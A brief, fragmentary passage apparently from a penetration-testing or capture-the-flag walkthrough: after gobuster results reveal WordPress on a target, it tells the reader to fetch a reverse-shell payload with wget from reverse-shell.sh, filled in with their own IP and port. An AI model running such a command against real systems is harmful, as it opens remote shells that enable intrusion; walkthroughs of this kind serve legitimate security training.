...
I review the gobuster report and notice that we have the findings below the most important being wordpress is running on the site:
...
go to the site linked above change the your port and IP parameters

can wget https://reverse-shell.sh/yourip:port so save its contents
